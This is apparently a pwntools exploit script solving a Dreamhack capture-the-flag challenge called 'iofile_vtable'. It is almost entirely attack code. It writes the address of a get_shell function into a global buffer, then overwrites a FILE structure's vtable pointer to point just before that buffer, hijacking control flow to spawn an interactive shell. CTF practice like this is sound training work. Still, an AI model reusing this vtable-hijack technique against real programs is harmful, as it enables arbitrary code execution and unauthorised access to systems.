from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './iofile_vtable'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()

#context.log_level = 'debug'
#p = remote('host3.dreamhack.games',9424)
get_shell_addr = elf.symbols['get_shell']
name_addr = elf.symbols['name']
info('name_addr: ' + hex(name_addr))
p.recvuntil(b"what is your name: ")
p.send(p64(get_shell_addr))

p.recvuntil(b'> ')
p.sendline(b"4")

p.sendafter(b'change: ',p64(name_addr- 0x38))
p.recvuntil(b'> ')
p.sendline(b"2")


p.interactive()